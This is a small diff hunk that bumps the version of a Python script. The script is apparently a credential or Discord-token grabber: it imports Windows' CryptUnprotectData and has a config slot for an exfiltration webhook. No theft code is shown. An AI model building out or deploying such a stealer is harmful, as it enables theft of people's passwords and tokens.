@@ -23,7 +23,7 @@ from win32crypt import CryptUnprotectData
 from datetime import datetime, timezone, timedelta
 
 __author__ = "Rdimo"
-__version__ = '1.8.6'
+__version__ = '1.8.7'
 __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
